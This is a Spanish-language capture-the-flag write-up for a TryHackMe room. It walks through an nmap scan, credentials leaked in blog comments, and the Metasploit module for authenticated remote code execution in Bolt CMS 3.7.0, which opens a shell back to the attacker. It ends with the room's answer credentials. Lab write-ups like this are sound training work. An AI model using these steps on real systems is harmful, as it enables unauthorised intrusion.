Bienvenidos a otra sala de TryHackMe. Esta vez, tendremos una maquina con dificultad facil, haremos una breve inspeccion para obtener las credenciales y haremos uso de #Metasploit utilizando la vulnerabilidad #RCE (Remote Code Execution), Esta vulnerabilidad ocurre cuando un atacante puede ejecutar codigo en un sistema remoto de forma no autorizada, para luego,  obtener nuestra flag.

# Recon

Iniciamos nuestro reconocimiento como siempre con nuestra herramienta **nmap** para que nos muestre puertos abiertos, versiones del servicio, entre otras cosas!. Ejecutaremos : ``sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap``

Tendremos un escaneo bastante volatil, pero nos centraremos en esta informacion :
```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.22s latency).
Scanned at 2023-04-26 18:09:02 EDT for 44s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
8000/tcp open  http    syn-ack ttl 63 (PHP 7.2.32-1)
```

Nuestro escaneo nos muestra 3 puertos abiertos. Navegaremos al puerto 8000 que nos llevara a un blog. Haremos un reconocimiento en la pagina, y nos daremos cuenta que utiliza **bolt** como CMS. Tambien, podremos ver comentarios de **Jake** (ADMIN), en el cual, nos mostrara las credenciales que usaremos mas adelante para entrar en el sistema.

# Exploit

Como sabemos que la pagina tiene **bolt** ,como CMS, iniciaremos nuestro #Metasploit y buscaremos vulneralidades llamadas **bolt**, ya que no sabremos que version esta utilizando.

> `msfconsole` --> Abrimos #Metasploit 
> `search bolt` --> Buscamos vulnerabilidad

```ruby
msf6 > search bolt

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/webapp/bolt_authenticated_rce  2020-05-07       excellent  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
   1  exploit/multi/http/bolt_file_upload         2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/http/bolt_file_upload
```

Seleccionaremos la  vulnerabilidad #RCE para esta tarea, modificaremos los siguientes patrones y lo ejecutaremos para abrir una terminal no autorizada de forma remota en el sistema. 

Seleccionamos con `use 0` y veremos las opciones a configurar utilizando `show options`

```ruby
RHOSTS 'IPTARGET'
RPORT '8000'
USERNAME 'credenciales'
PASSWORD 'credenciales'
LHOST 'Ip maquina atacante'
```

Lo ejecutaremos con `run` y ya tendremos acceso al sistema para reclamar la flag!

#  Respuestas

#credentials bolt:boltadmin123
